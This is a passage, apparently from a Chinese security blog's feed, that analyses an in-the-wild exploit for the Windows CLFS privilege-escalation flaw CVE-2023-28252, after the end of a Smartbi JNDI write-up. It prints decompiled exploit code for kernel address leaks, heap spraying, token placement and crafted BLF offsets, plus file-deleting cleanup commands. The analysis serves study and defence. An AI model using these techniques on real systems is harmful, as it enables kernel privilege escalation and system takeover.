}</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">finally</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (conn<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span> conn.<span style="color:#a6e22e">close</span>();</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (Throwable th) {</span></span><span style="display:flex;"><span> Logger.<span style="color:#a6e22e">getLogger</span>(getClass()).<span style="color:#a6e22e">debug</span>(SmartbiXDataSetUtil.<span style="color:#a6e22e">OTHER</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ds.<span style="color:#a6e22e">getUrl</span>().<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">"JNDI:"</span>)) {</span></span><span style="display:flex;"><span> ConnectionPool.<span style="color:#a6e22e">getInstance</span>().<span style="color:#a6e22e">closePool</span>(ds);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>题外话，我本身不懂Java那一套，只是按照粗浅的代码理解去分析漏洞，有机会去分析一下JNDI注入原理。</p><p><strong>参考链接</strong></p><blockquote><p><a href="https://www.smartbi.com.cn/patchinfo" target="_blank">https://www.smartbi.com.cn/patchinfo</a></p></blockquote><p><strong>Created at 2023-06-16T16:07:41+08:00</strong></p></description></item><item><title>CVE-2023-28252</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/cve-2023-28252/</link><pubDate>Wed, 31 May 2023 19:44:15 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/cve-2023-28252/</guid><description><h3 id="基本信息">基本信息</h3><p>clfs中存在权限提升漏洞。</p><h3 id="影响版本">影响版本</h3><p>略</p><h3 id="环境搭建">环境搭建</h3><ul><li>windows 10 21h2 19044.2728</li><li>windbg</li><li>x64dbg</li></ul><h3 id="技术分析调试">技术分析&amp;调试</h3><p><strong>静态分析</strong></p><p>样本加了Themida的壳，参考<a href="https://github.com/VenTaz/Themidie" target="_blank">https://github.com/VenTaz/Themidie</a>对其进行绕过。</p><p>脱壳之后dump出原始样本进行分析，如下。核心逻辑在InitAndHeapSpray函数中：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span><span style="color:#66d9ef">__cdecl</span><span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc,<span style="color:#66d9ef">const</span><span style="color:#66d9ef">char</span><span style="color:#f92672">**</span>argv,<span style="color:#66d9ef">const</span><span style="color:#66d9ef">char</span><span style="color:#f92672">**</span>envp)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span>.....</span></span><span style="display:flex;"><span> v3<span style="color:#f92672">=</span><span style="color:#a6e22e">InitAndHeapSpray</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">sub_7FF662B24F98</span>() )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_20;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>v4 )</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662B28D3C</span>();</span></span><span style="display:flex;"><span><span style="color:#a6e22e">LOBYTE</span>(v10)<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662B24CA4</span>(v10,<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> v3;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>该函数首先清空工作目录，而后通过查询注册表获取系统版本，在通过NtQuerySystemInformation函数并传入SystemExtendedHandleInformation参数来获取System及自身token地址，其逻辑和CVE-2022-37969基本一样</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662B265E4</span>((<span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">NtCurrentTeb</span>()<span style="color:#f92672">-></span>NtTib.FiberData<span style="color:#f92672">+</span> v0);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">"del /f C:</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Public</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.contain* 2> nul 1> nul"</span>);<span style="color:#75715e">// 删除文件</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">"del /f C:</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Public</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">MyLog* 2> nul 1> nul"</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">"del /f C:</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Public</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">p_* 2> nul 1> nul"</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>dwProcessId<span style="color:#f92672">=</span><span style="color:#a6e22e">GetCurrentProcessId</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">CheckOSVersion</span>() )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">GetObjectKernelAddress</span>() )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662B21010</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">"fail RW</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>而后初始化并获取一系列内核函数地址，包括ClfsEarlierLsn、ClfsMgmtDeregisterManagedClient、SeSetAccessStateGenericMapping、RtlClearBit，获取方式和CVE-2022-37969基本一样。通过LoadLibraryEx在r3载入ntoskrnl.exe、clfs.sys获取到函数相对于基址的偏移，而后通过NtQuerySystemInformation并传入SystemModuleInformation获取到内核载入的所有模块的基址。通过比较模块的FullPathName来确定clfs.sys和ntoskrnl.exe在内核的基址，将内核基址和函数偏移相加即可获得函数在内核的地址</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ClfsEarlierLsnKernelAddress<span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span>)<span style="color:#a6e22e">GetKernelFuncAddr</span>(<span style="color:#e6db74">"ClfsEarlierLsn"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ClfsEarlierLsnKernelAddress )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> ClfsMgmtDeregisterManagedClientAddress<span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span>)<span style="color:#a6e22e">GetKernelFuncAddr</span>(<span style="color:#e6db74">"ClfsMgmtDeregisterManagedClient"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( versionFlag )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> ntoskrnl_KernelBase<span style="color:#f92672">=</span><span style="color:#a6e22e">FindKernelModulesBase</span>(<span style="color:#e6db74">"</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">SystemRoot</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">system32</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">ntoskrnl.exe"</span>);</span></span><span style="display:flex;"><span> Library<span style="color:#f92672">=</span><span style="color:#a6e22e">LoadLibraryExW</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">"ntoskrnl.exe"</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">1u</span>);</span></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v5<span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span>)Library;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( Library )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> PoFxProcessorNotificationAddress<span style="color:#f92672">=</span><span style="color:#a6e22e">GetProcAddress</span>(Library,<span style="color:#e6db74">"PoFxProcessorNotification"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>PoFxProcessorNotificationAddress )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_18;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E7AF0D</span>(v5);</span></span><span style="display:flex;"><span> PoFxProcessorNotificationKernelAddress<span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span>)PoFxProcessorNotificationAddress</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span> (_QWORD)ntoskrnl_KernelBase</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span> v5;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> PoFxProcessorNotificationKernelAddress<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> PoFxProcessorNotificationKernelAddress1<span style="color:#f92672">=</span> PoFxProcessorNotificationKernelAddress;</span></span><span style="display:flex;"><span> ntoskrnl_kernel_base<span style="color:#f92672">=</span><span style="color:#a6e22e">FindKernelModulesBase</span>(<span style="color:#e6db74">"</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">SystemRoot</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">system32</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">ntoskrnl.exe"</span>);</span></span><span style="display:flex;"><span> ntoskrnl_base<span style="color:#f92672">=</span><span style="color:#a6e22e">LoadLibraryExW</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">"ntoskrnl.exe"</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">1u</span>);</span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span>)ntoskrnl_base;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ntoskrnl_base )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> SeSetAccessStateGenericMappingAddressKernelAddr<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_21;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> SeSetAccessStateGenericMappingAddress<span style="color:#f92672">=</span><span style="color:#a6e22e">GetProcAddress</span>(ntoskrnl_base,<span style="color:#e6db74">"SeSetAccessStateGenericMapping"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( SeSetAccessStateGenericMappingAddress )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E7AF0D</span>(v10);</span></span><span style="display:flex;"><span> SeSetAccessStateGenericMappingAddressKernelAddr<span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span>)SeSetAccessStateGenericMappingAddress</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span> (_QWORD)ntoskrnl_kernel_base</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span> v10;</span></span></code></pre></div><p>样本在0x5000000位置处申请大小0x100000的内存，很明显这块和CVE-2022-37969的申请内存一样，而后将ntdll.dll载入到进程中并获取NtQuerySystemInformation函数地址，通过CreateFile打开C:\Users\Public\p_%08d格式文件的句柄并验证句柄有效性，接着获取到NtFsControlFile函数地址</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">VirtualAlloc</span>((LPVOID)<span style="color:#ae81ff">0x5000000</span>,<span style="color:#ae81ff">0x100000u</span>i64,<span style="color:#ae81ff">0x3000u</span>,<span style="color:#ae81ff">4u</span>) )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v24<span style="color:#f92672">=</span><span style="color:#a6e22e">rand</span>();</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>(v96,<span style="color:#ae81ff">0</span>,<span style="color:#66d9ef">sizeof</span>(v96));</span></span><span style="display:flex;"><span><span style="color:#a6e22e">wsprintf</span>((<span style="color:#66d9ef">__int64</span>)v96, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">L</span><span style="color:#e6db74">"C:</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Public</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">p_%08d"</span>, v24);</span></span><span style="display:flex;"><span> Filew<span style="color:#f92672">=</span><span style="color:#a6e22e">CreateFilew</span>((<span style="color:#66d9ef">__int64</span>)v96,<span style="color:#ae81ff">0xC0000000</span>i64,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">256</span>,<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( Filew<span style="color:#f92672">==</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E75E1F</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">1</span>i64;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> ntdll_hmodule<span style="color:#f92672">=</span> (HMODULE)<span style="color:#a6e22e">LoadLibrary</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">L</span><span style="color:#e6db74">"ntdll"</span>);</span></span><span style="display:flex;"><span> NtQuerySystemInformationAddress<span style="color:#f92672">=</span> (<span style="color:#a6e22e">NTSTATUS</span> (<span style="color:#66d9ef">__stdcall</span><span style="color:#f92672">*</span>)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))<span style="color:#a6e22e">GetProcAddress</span>(ntdll_hmodule,<span style="color:#e6db74">"NtQuerySystemInformation"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( NtQuerySystemInformationAddress )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ( i<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span>; ; i<span style="color:#f92672">=</span> v82 )</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>v31 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> object<span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">*</span>(p_UniqueProcessId<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v33<span style="color:#f92672">==</span><span style="color:#f92672">*</span>p_UniqueProcessId<span style="color:#f92672">&amp;&amp;</span> p_UniqueProcessId[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">==</span> (HANDLE)Filew )<span style="color:#75715e">// 这里获取的是前面通过CreateFile返回的句柄object</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">break</span>;</span></span><span style="display:flex;"><span> v27<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)(v27<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>);</span></span><span style="display:flex;"><span> p_UniqueProcessId<span style="color:#f92672">+=</span><span style="color:#ae81ff">5</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)v27<span style="color:#f92672">>=</span> v30<span style="color:#f92672">-></span>NumberOfHandles )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_46;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> qword_7FF662B44710<span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">*</span>(p_UniqueProcessId<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);<span style="color:#75715e">// Object</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">if</span> ( object )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_51;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span>LABEL_46:</span></span><span style="display:flex;"><span> qword_7FF662B44710<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">1</span>i64;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> qword_7FF662B44710<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>i64;</span></span><span style="display:flex;"><span>LABEL_51:</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_OWORD<span style="color:#f92672">*</span>)hReadPipe<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> Size<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">LODWORD</span>(v82)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( versionFlag )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">LODWORD</span>(v36)<span style="color:#f92672">=</span><span style="color:#a6e22e">LoadModule</span>(<span style="color:#e6db74">"ntdll"</span>, (LPVOID)v27);</span></span><span style="display:flex;"><span> NtFsControlFileAddress<span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">*</span>)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _QWORD, _DWORD, _QWORD, _DWORD))<span style="color:#a6e22e">GetProcAddress</span>(v36,<span style="color:#e6db74">"NtFsControlFile"</span>);</span></span></code></pre></div><p>样本创建匿名管道并调用NtFsControlFile函数，通过传入0x11003C，使得之后我们可以再次调用NtFsControlFile并传入0x110038来获取到管道的属性，这点利用和CVE-2022-37969一样。在创建匿名管道后通过NtQuerySystemInformation函数获取到内核中的堆信息，并通过比较堆大小和tag获取到这个管道在内核中对应的堆内存。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">CreatePipe</span>(<span style="color:#f92672">&amp;</span>hReadPipe[<span style="color:#ae81ff">1</span>], hReadPipe,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0x10000u</span>) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E77D93</span>(<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__debugbreak</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> Size<span style="color:#f92672">=</span> (<span style="color:#66d9ef">size_t</span>)<span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x2000u</span>i64);</span></span><span style="display:flex;"><span> v37<span style="color:#f92672">=</span> (_WORD<span style="color:#f92672">*</span>)Size;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>((<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)(Size<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>),<span style="color:#ae81ff">65</span>,<span style="color:#ae81ff">0xFFEu</span>i64);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>v37<span style="color:#f92672">=</span><span style="color:#ae81ff">90</span>;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662B21B80</span>(<span style="color:#ae81ff">4096</span>,<span style="color:#e6db74">"NpAt"</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>(v95,<span style="color:#ae81ff">66</span>,<span style="color:#ae81ff">0xFFu</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">NtFsControlFileAddress</span>(hReadPipe[<span style="color:#ae81ff">0</span>],<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0</span>i64, v92,<span style="color:#ae81ff">0x11003C</span>, v37,<span style="color:#ae81ff">4056</span>, v95,<span style="color:#ae81ff">256</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662B21B80</span>(<span style="color:#ae81ff">4096</span>,<span style="color:#e6db74">"NpAt"</span>,<span style="color:#ae81ff">0</span>, (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>qword_7FF662B440C8);</span></span></code></pre></div><p>之后在0xFFFFFFFF地址处申请0x1000大小的内存，并将system token布局到该地址，这点和CVE-2022-37969一致。在CVE-2022-37969中该处用于写入token。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">LODWORD</span>(v82)<span style="color:#f92672">=</span> system_EPROCESS<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFFF</span>;</span></span><span style="display:flex;"><span> v38<span style="color:#f92672">=</span> system_EPROCESS<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFFFFFFFFFFFFF000u</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">VirtualAlloc</span>(<span style="color:#75715e">// 在0xFFFFFFFF地址申请内存</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> (LPVOID)<span style="color:#ae81ff">0xFFFFFFFF</span>i64,</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x1000u</span>i64,</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x3000u</span>,</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4u</span>) )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>((<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x100000007</span>i64,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0xFF8u</span>i64);</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0xFFFFFFFF</span>]<span style="color:#f92672">=</span> v38;<span style="color:#75715e">// 在0xFFFFFFFF写入system proc token</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> MEMORY[<span style="color:#ae81ff">0x100000007</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0x414141414141005A</span>i64;</span></span></code></pre></div><p>在之后就是漏洞利用的核心逻辑。创建一个日志文件Mylog并对以下的偏移进行了修改并对CRC进行了修复，这里将其称之为主blf文件。</p><p>修改日志文件之后打开日志文件并通过NtQuerySystemInformation查询到这个日志文件的base block的内核地址，而后调用AddLogContainer为该文件添加容器。</p><pre tabindex="0"><code>0x80c -> crc32 4字节
0x858 -> 0x369 4字节
0x1dd0 -> 0x15a0 4字节
0x1dd4 -> 0x1570 4字节
0x1de0 -> 0xC1FDF008 4字节
0x1de4 -> 0x30 4字节
0x1df8 -> 0x5000000 4字节
0x820c -> crc32 4字节
0x8258 -> 0x369 4字节
0x97D0 -> 0x15A0 4字节
0x97D4 -> 0x1570 4字节
0x97E0 -> 0xC1FDF008 4字节
0x97E4 -> 0x30 4字节
0x97F8 -> 0x5000000 4字节</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#a6e22e">CraftFile</span>()</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#a6e22e">wsprintf</span>((<span style="color:#66d9ef">__int64</span>)pszLogFileName, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">L</span><span style="color:#e6db74">"LOG:C:</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Public</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">MyLog_%08d"</span>, (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)(v0<span style="color:#f92672">+</span><span style="color:#ae81ff">16385</span>));</span></span><span style="display:flex;"><span><span style="color:#a6e22e">wsprintf</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>unk_7FF662B44110, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">L</span><span style="color:#e6db74">"C:</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Public</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">MyLog_%08d.blf"</span>, (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)(v0<span style="color:#f92672">+</span><span style="color:#ae81ff">16385</span>));</span></span><span style="display:flex;"><span><span style="color:#f92672">::</span>pszLogFileName<span style="color:#f92672">=</span> (LPCWSTR)<span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x500u</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">wsprintf</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>pwszContainerPath, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">L</span><span style="color:#e6db74">"C:</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">Public</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.container_1%d"</span>, (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)(v0<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>));</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E7B416</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>unk_7FF662B44110);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E7B416</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>pwszContainerPath);</span></span><span style="display:flex;"><span> LogFile<span style="color:#f92672">=</span><span style="color:#a6e22e">CreateLogFile</span>(pszLogFileName,<span style="color:#ae81ff">0xC0010000</span>,<span style="color:#ae81ff">3u</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">4u</span>,<span style="color:#ae81ff">0</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(LogFile);</span></span><span style="display:flex;"><span> Buffer<span style="color:#f92672">=</span><span style="color:#ae81ff">0x369</span>;</span></span><span style="display:flex;"><span> Filew<span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)<span style="color:#a6e22e">CreateFilew</span>((<span style="color:#66d9ef">__int64</span>)<span 